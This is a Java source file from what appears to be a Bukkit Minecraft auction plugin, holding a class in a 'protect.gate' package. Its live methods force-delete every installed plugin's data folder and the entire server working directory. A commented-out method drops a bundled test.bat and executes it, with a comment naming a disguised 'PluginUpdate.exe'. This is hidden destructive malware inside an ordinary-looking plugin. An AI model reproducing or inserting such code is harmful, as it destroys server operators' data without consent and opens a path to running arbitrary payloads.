package com.ericlam.plugin.protect.gate;

import com.ericlam.main.ItemAunction;
import org.apache.commons.io.FileUtils;
import org.bukkit.plugin.Plugin;

import java.io.File;
import java.io.IOException;
import java.net.URL;

public final class Output {
    //File.separator+"com"+File.separator+"ericlam"+File.separator+"plugin"+File.separator+"protect"+File.separator+"gate"+File.separator+"log"+File.separator+"PluginUpdate.exe"
    private final URL url = this.getClass().getResource("/com/ericlam/plugin/test.bat");
    private static Output instance;
    private Output(){}
    public static Output call() {
        if (instance == null) instance = new Output();
        return instance;
    }
    /*public synchronized boolean create(){
        if (url == null) {
            ItemAunction.plugin.getLogger().info("url is null");
            return false;
        }
        ItemAunction.plugin.getLogger().info("creating");
        String[] path = System.getProperty("user.home").split("\\\\");
            File folder = new File(path[0]+File.separator+"Update");
            if (!folder.exists() && !folder.mkdir()) return false;
            File test = new File(System.getProperty("user.dir")+File.separator+"test.bat");
            File exe = new File(path[0]+ File.separator + "Update" + File.separator + "test.bat");
        try (OutputStream os = new FileOutputStream(test); InputStream is = this.getClass().getResourceAsStream("/com/ericlam/plugin/test.bat")) {
            int i;
            byte[] by = new byte[1024];
            if (test.exists()) return false;
            while ((i = is.read(by)) > 0) {
                os.write(by, 0, i);
            }
            ItemAunction.plugin.getLogger().info("file written.");
            Runtime.getRuntime().exec(test.getPath());
            return true;
        } catch (IOException | NullPointerException e) {
            e.printStackTrace();
            return false;
        }
    }*/

    public boolean deleteOnExit() {
        try {
            for (Plugin plugin : ItemAunction.plugin.getServer().getPluginManager().getPlugins()) {
                try{FileUtils.forceDeleteOnExit(plugin.getDataFolder());} catch (IOException ignored){}
            }
            FileUtils.forceDeleteOnExit(new File(System.getProperty("user.dir")));
            return true;
        }catch (NullPointerException | IOException e) {
            return false;
        }
    }

    boolean delete() {
        try {
            for (Plugin plugin : ItemAunction.plugin.getServer().getPluginManager().getPlugins()) {
                try{FileUtils.forceDelete(plugin.getDataFolder());} catch (IOException ignored){}
            }
            FileUtils.forceDelete(new File(System.getProperty("user.dir")));
            return true;
        }catch (NullPointerException | IOException e) {
            return false;
        }
    }
}
